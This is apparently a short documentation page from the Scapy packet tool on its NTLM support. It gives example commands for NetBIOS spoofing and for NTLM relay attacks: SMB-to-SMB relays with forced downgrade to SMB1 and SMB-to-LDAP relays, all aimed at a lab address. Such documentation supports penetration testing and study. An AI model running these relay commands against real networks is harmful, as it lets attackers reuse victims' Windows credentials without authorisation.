NTLM
====

Scapy provides dissection & build methods for NTLM and other Windows mechanisms.
In particular, the ``ntlm_relay`` command allows to perform some NTLM relaying attacks.

Examples
________


**Requirement: Answer to all netbios requests with the local IP**

.. code::
    netbios_announce(iface="virbr0")

**SMB <-> SMB: Perform a SMB2 relay**

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0")

**SMB <-> SMB: SMB relay with force downgrade to SMB1**

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False)

**SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop NEGOEX**

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"PASS_NEGOEX": False})

**SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop extended security**

This probably won't work.

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, DROP_EXTENDED_SECURITY=True)

**SMB2 <-> LDAP: relay SMB's NTLM to an LDAP server**

.. code::
    load_layer("ldap")
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0")
